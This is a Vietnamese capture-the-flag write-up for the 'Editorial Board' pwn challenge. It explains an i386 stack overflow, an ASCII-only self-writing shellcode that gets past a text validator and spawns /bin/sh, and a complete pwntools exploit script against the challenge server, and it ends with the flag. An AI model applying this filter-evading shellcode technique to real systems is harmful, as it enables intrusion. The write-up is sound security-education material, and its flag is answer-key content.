# Editorial Board

## Tóm tắt

Challenge nhận một manuscript, kiểm tra nội dung bằng `validate.py`, rồi chép dữ liệu vào một vùng stack nhỏ. Payload hợp lệ có thể ghi đè địa chỉ trả về; vùng nhớ RWX cố định và bộ lọc ký tự ASCII cho phép dựng shellcode bằng các byte là chữ, dấu câu. Payload cuối vừa qua validator, vừa chạy được trên remote để đọc flag.

## Lời giải

### Bước 1: Tìm overflow và điểm quay lại

Binary là i386. Chương trình đọc tối đa 900 byte vào input buffer, kiểm tra manuscript, chép nó vào mapping cố định rồi gọi hàm copy có local buffer 601 byte. Hàm copy dùng `rep movsb` với độ dài do người dùng kiểm soát; vì vậy dữ liệu vượt quá 601 byte ghi đè saved EBP và saved EIP.

Offset saved EIP là `601 + 4 = 605`. Sau khi chép dữ liệu, helper đặt `ECX = 0x656c6261`, `EAX = 0`, rồi trả về. Mapping tại `0x656c6000` có quyền đọc, ghi, thực thi và được khởi tạo bằng `0xff` trên toàn bộ 64 KiB.

Ký tự lọc của payload không cho phép byte máy tùy ý. Tuy nhiên, chuỗi `!ale` được mã hóa little-endian thành `0x656c6121`, tức địa chỉ `0x656c6000 + 0x121`. Đặt `!ale` tại offset 605 đưa luồng thực thi vào payload ở offset 289.

### Bước 2: Dùng các ký tự ASCII làm trampoline và dựng shellcode

Payload dùng các lệnh x86 trùng với ký tự được validator cho phép:

| Byte | Lệnh i386 | Vai trò |
|---|---|---|
| `A` (`0x41`) | `inc ecx` | Tăng ECX |
| `u<disp>` (`0x75`) | `jnz rel8` | Nhảy qua đoạn văn bản |
| `-<imm32>` (`0x2d`) | `sub eax, imm32` | Tạo địa chỉ hoặc một dword shellcode |
| `!A;` (`0x21 0x41 0x3b`) | `and dword ptr [ecx+0x3b], eax` | Ghi một dword vào mapping |
| `X`, `P`, `Y` | `pop eax`, `push eax`, `pop ecx` | Lấy hằng số từ payload và chuyển giá trị giữa thanh ghi |

Trampoline bắt đầu tại offset 289. `A` tăng ECX để cờ zero bị xóa; `us` tại offset 290 nhảy đến 407. `up` tại 407 nhảy đến 521, rồi `us` tại 521 nhảy đến offset 638. Các vùng văn bản nằm giữa những điểm này không được thực thi.

Tại offset 638, `pop eax` lấy lại dword `!ale` ở offset 609 trên stack copy. Các phép trừ với immediate ASCII `book` năm lần, `does`, và `yams` đưa EAX đến `0x656c635a`. `push eax; pop ecx` chuyển giá trị đó vào ECX. Lệnh `pop eax` tiếp theo lấy dword ASCII ` for` từ offset 613.

Năm nhóm `sub eax, imm32` sau đó tạo năm dword shellcode. `!A;` ghi từng dword tại `[ECX+0x3b]`; bốn lệnh `A` tăng ECX thêm bốn byte giữa các lần ghi. Vì mapping ban đầu là `0xff`, phép AND với EAX tạo đúng dword mong muốn. ECX ban đầu là `0x656c635a`, nên địa chỉ ghi đầu tiên là `0x656c635a + 0x3b = 0x656c6395`, tức offset 917.

| Nhóm immediate ASCII | Dword sau phép trừ | Byte được ghi |
|---|---:|---|
| ` for`, `Have`, `Data`, `word`, `mesa` | `0x732f6890` | `90 68 2f 73` |
| `-My `, `;Cut`, `Low:`, `that` | `0x2f680068` | `68 00 68 2f` |
| `CAVE`, `As; `, `At: `, `An- ` | `0x896e6962` | `62 69 6e 89` |
| `busy`, `owes`, `Lynx`, `byes` | `0xb0c189e3` | `e3 89 c1 b0` |
| `WHEN`, `amen`, ` ;Is` | `0x80cd990b` | `0b 99 cd 80` |

Năm dword này tạo shellcode 20 byte tại offset 917:

```text
90 68 2f 73 68 00 68 2f 62 69 6e 89 e3 89 c1 b0 0b 99 cd 80
```

`push 0x0068732f` và `push 0x6e69622f` đặt chuỗi `/bin/sh\0` trên stack. Các lệnh còn lại đặt `EBX` trỏ tới chuỗi, để `ECX` và `EDX` bằng 0, đặt syscall number 11, rồi gọi `int 0x80` để thực hiện `execve("/bin/sh", NULL, NULL)`. Linux trong container chấp nhận argv NULL. Hai nhánh ở cuối payload nhảy đến offset 917, vượt qua phần văn bản còn lại.

### Bước 3: Qua validator và chạy exploit

`candidate_final.txt` dài 900 byte, chỉ chứa ký tự được phép. Nó có 251 từ, 40 câu, không có lỗi chính tả. LanguageTool báo năm lỗi `SENTENCE_WHITESPACE` do các byte `!A;` đồng thời là mã lệnh. Mật độ là 1.99 lỗi trên 100 từ, repetition ratio là 0.032, điểm cuối 88.29 nên validator chấp nhận payload.

`solve.py` gửi manuscript qua TLS đến instance, sau đó gửi lệnh shell để đọc `/tmp/flag.txt`. Chạy local bằng `LOCAL=1` để kiểm tra shell với validator thật; chạy không tham số để kết nối remote. Cần giữ `candidate_final.txt` cùng thư mục với script.

```python
#!/usr/bin/env python3
from pathlib import Path

from pwn import *

context.arch = "i386"
context.log_level = "info"

HERE = Path(__file__).resolve().parent
CHALLENGE = HERE.parent
exe = ELF(str(CHALLENGE / "editorial_board"), checksec=False)

HOST = args.HOST or "editorial-board-934cfb4bc4e4.inst2.ctf.fortid.com"
PORT = int(args.PORT or 1337)
LOCAL = bool(args.LOCAL)

payload = (HERE / "candidate_final.txt").read_bytes()
if len(payload) != 900:
    raise SystemExit(f"expected a 900-byte payload, got {len(payload)}")

if LOCAL:
    p = process([exe.path])
else:
    p = remote(HOST, PORT, ssl=True)
p.timeout = 60

p.recvuntil(b"Submit your manuscript:")
p.sendline(payload)
if LOCAL:
    p.sendline(b"echo LOCAL_SHELL_OK; id; exit")
else:
    p.sendline(b"cat /tmp/flag.txt; exit")

result = p.recvall(timeout=60)
print(result.decode("latin1", errors="replace"))
expected = b"LOCAL_SHELL_OK" if LOCAL else b"FortID{"
if expected not in result:
    raise SystemExit(f"missing success marker: {expected.decode()}")
```

Local verification passed 10/10 with the real validator. The same payload was accepted remotely and read the flag from `/tmp/flag.txt`.

## Flag

```text
FortID{Sh3llc0d1n6_L1k3_Sh4k3sp34r3_G3ts_7h3_Fl4G!_d91a985ca6}
```